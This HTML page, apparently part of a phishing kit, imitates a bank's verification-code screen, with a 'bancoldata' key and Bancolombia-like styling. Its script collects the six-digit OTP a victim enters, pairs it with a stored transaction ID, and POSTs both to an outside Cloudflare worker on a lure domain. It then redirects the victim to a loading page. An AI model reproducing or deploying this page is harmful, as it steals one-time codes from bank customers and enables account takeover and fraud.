<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Código de Verificación</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body, html {
            height: 100%;
            width: 100%;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        .image-container {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        .image-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .center-box {
            position: absolute;
            top: 55%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: rgb(255, 255, 255);
            width: 290px;
            height: 66px;
            display: flex;
            justify-content: center;
            align-items: center;
            border-radius: 8px;
        }
        .center-box .input-container {
            position: relative;
            width: 80%;
            display: flex;
            justify-content: space-between;
        }
        .center-box input {
            width: 35px;
            height: 50px;
            text-align: center;
            font-size: 19px;
            border: none;
            border-bottom: 1px solid #ffe100;
            outline: none;
        }
        .button-container {
            position: absolute;
            top: 70.4%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: flex;
            gap: 10px;
        }
        .button-container button {
            padding: 13px 35px;
            font-size: 13px;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
        }
        .button-container button:first-child {
            background-color: #ffffff;
            border: 1px solid black;
        }
        .button-container button:last-child {
            background-color: #ffda37;
            color: black;
        }
    </style>
</head>
<body>
    <div class="image-container">
        <img src="img/cel1.jpg" alt="Background Image">
        <div class="center-box">
            <div class="input-container">
                <input type="tel" maxlength="1" id="input1">
                <input type="tel" maxlength="1" id="input2">
                <input type="tel" maxlength="1" id="input3">
                <input type="tel" maxlength="1" id="input4">
                <input type="tel" maxlength="1" id="input5">
                <input type="tel" maxlength="1" id="input6">
            </div>
        </div>
        <div class="button-container">
            <button onclick="window.history.back()">Cancelar</button>
            <button id="loginButton">Ingresar</button>
        </div>
    </div>

    <script>
        const inputs = document.querySelectorAll('input[type="tel"]');
        const loginButton = document.getElementById('loginButton');

        loginButton.addEventListener('click', async () => {
            const otpCode = Array.from(inputs).map(input => input.value).join('');
            
            if (otpCode.length === 6) {
                try {
                    // Obtener datos de localStorage
                    let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
                    const transactionId = bancoldata.transactionId;

                    if (!transactionId) {
                        alert('Error: No se encontró la transacción');
                        return;
                    }

                    console.log('Enviando OTP:', { transactionId, otp: otpCode });

                    // Enviar OTP al worker
                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            transactionId: transactionId,
                            otp: otpCode
                        })
                    });

                    const result = await response.json();
                    console.log('Respuesta OTP:', result);
                    
                    if (result.ok) {
                        // Redirigir a la página de loading
                        window.location.href = 'loading.html';
                    } else {
                        alert('Error en el OTP: ' + (result.error || 'Error desconocido'));
                    }
                    
                } catch (error) {
                    console.error('Error completo:', error);
                    alert('Error al procesar el OTP: ' + error.message);
                }
            } else {
                alert('Por favor, ingrese un código de 6 dígitos.');
            }
        });

        // También enviar con Enter en cualquier input
        inputs.forEach(input => {
            input.addEventListener('keypress', (e) => {
                if (e.key === 'Enter') {
                    loginButton.click();
                }
            });
        });
    </script>
</body>
</html>
